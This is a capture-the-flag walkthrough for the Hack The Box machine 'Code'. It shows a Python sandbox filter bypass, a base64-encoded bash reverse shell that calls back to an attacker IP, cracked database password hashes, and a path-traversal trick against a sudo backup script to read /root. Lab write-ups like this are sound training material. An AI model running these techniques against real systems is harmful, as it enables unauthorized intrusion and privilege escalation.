---
name: Code
difficulty: easy
os: linux
platform: htb

img: https://labs.hackthebox.com/storage/avatars/55cc3528cd7ad96f67c4f0c715efe286.png
---


## Enumeration
### Port Scan
We start by scanning the target machine for open ports using Nmap. We will use the `-p-` option to scan all ports and the `--open` option to filter out closed ports
```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.64 -o allPorts
```
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
```
We can see that port 22 is open, which is the SSH service. 

Now we will scan for all tcp, open and filtered, ports
```bash
nmap -p- -sS --min-rate 5000 -n -Pn -vvv 10.10.11.64 -o allPortsFiltered
```
```
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
5000/tcp open  upnp    syn-ack ttl 63
```
We can see that port 5000 is also open.

Now we will scan the open ports with service version detection and script scanning using `-sC` and `-sV` options
```bash
nmap -p 22,5000 -sCV 10.10.11.62 -o targeted
```
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5b97cc4503295bcc26517df51a27abd (RSA)
|   256 94b525549b68afbe40e11da86b850d01 (ECDSA)
|_  256 128cdc97ad8600b488e229cf69b56596 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## User Exploitation

When accessing `http://10.10.11.62` it shows up a python code editor. We can create a new file and write some Python code in it. The web application allows us to execute the code we write.

We write the following Python code to do ls for `/` and `/home`:
```python
oas = sys.modules['o'+'s']
print(oas.listdir('.'))

print(oas.listdir('/'))
print(oas.listdir('/home')) 
#print(oas.listdir('/ro'+'ot'))
```
```
['app.py', 'static', 'templates', '__pycache__', 'instance'] 
['bin', 'lib64', 'proc', 'run', 'sbin', 'usr', 'lib32', 'home', 'var', 'srv', 'libx32', 'boot', 'tmp', 'lost+found', 'lib', 'root', 'sys', 'media', 'mnt', 'etc', 'dev', 'opt'] 
['martin', 'app-production'] 
```
Note that the system blocks some strings like `os`, `import` or `root` in the code editor, so we have to use other ways to access the modules and directories.
As we can see, we can find the home directory of the user `martin` and the `app-production` directory. We do not have access to `/root`

We dont have access to `/home/martin`

We can do ls on the `app-production` directory:
```python
oas = sys.modules['o'+'s']
print(oas.listdir('/home/app-production'))
```
```
['user.txt', '.local', '.sqlite_history', '.profile', '.python_history', '.cache', '.bash_logout', '.bash_history', '.bashrc', 'app'] 
```
We can see that we have a file called `user.txt` in the `app-production` directory. We can read it using the following code:
```python
wd = sys.modules['subpr'+'ocess']
output = wd.check_output(['cat', '/home/app-production/user.txt'])
print(output.decode())
```
```
user flag value
```

## Machine Access
We can access the machine using a reverse shell. We can use the following Python code
```python
a = sys.modules['subp' + 'rocess']
output = a.check_output('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42O' +
                         'S80NDQ0IDA+JjE= | base64 -d | bash', shell=True)
print(output.decode())
```
This code will execute a reverse shell command that connects back to our machine. Make sure to set
up a listener on your machine to catch the reverse shell
```bash
nc -lvnp 4444
```
Once we have a reverse shell, we can get a persistent shell by using the following commands on the reverse shell
```bash
script /dev/null -c /bin/bash
CONTROL-Z
stty raw -echo; fg
reset xterm
export TERM=xterm
```
We can access the web page source code at app.py and we find credentials for database:
```python
app.config['SECRET_KEY'] = "7j4D5htxLHUiffsjLXB1z9GaZ5"
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
```
We also see that there is a table called `USER` in the database. We can use the credentials to access the database and retrieve the user information.
We can use the `sqlite3` command-line tool to access the SQLite database. 
```bash
sqlite3 instance/database.db "SELECT * FROM USER;"
```
```
1|development|759b74ce43947f5f4c91aeddc3e5bad3
2|martin|3de6f30c4a09c27fc71932bfc68474be
3|test|c06db68e819be6ec3d26c6038d8e8d1f
```
We can see that there are three users in the database: `development`, `martin`, and `test`. It looks like the passwords are hashed.
We can use `https://crackstation.net/` to crack the hashes. After cracking the hashes, we find the following credentials:
```
development:development
martin:nafeelswordsmaster
test:test12345
```
This allows us to access the machine as the user `martin` with the password `nafeelswordsmaster` through SSH.
```bash
ssh martin@10.10.11.62
```

## Root Exploitation
Once we have access to the user `martin`, we can check what sudo privileges the user has. 
```bash
sudo -l
```
```
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```
As we can see, the user `martin` has the ability to run the script `/usr/bin/backy.sh` as root without a password. We can check the contents of the script to see if it is vulnerable or misconfigured.

This script is a script that backups a directory. We can pass as parameter this json configuration file
```
{
  "destination": "/home/martin/test/",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/var/....//root"
  ],
  "exclude": [
    "test"
  ]
}
```
Note that the `directories_to_archive` field contains a path to `/var/....//root`, because the script removes al `../` from the path, it will end up being `/var/../root`, which is the root directory `/root`. 

And then run the script as root:
```bash
sudo /usr/bin/backy.sh /home/martin/task.json'
```

It will create a backup of the `/root` directory in the `/home/martin/test/` directory. We can extract the backup and find the root flag:
```bash
tar -xvjf code_var_.._root_2025_July.tar.bz2 
cat root/root.txt
```
```
root flag value
```

## Conclusion
This walkthrough demonstrates how to exploit a vulnerable web application to gain access to the user and root flags. We used Python code execution to read files and execute commands, and we exploited a misconfigured backup script to gain root access. This highlights the importance of secure coding practices and proper configuration management in web applications.
This walkthrough is for educational purposes only. Always ensure you have permission to test and exploit systems.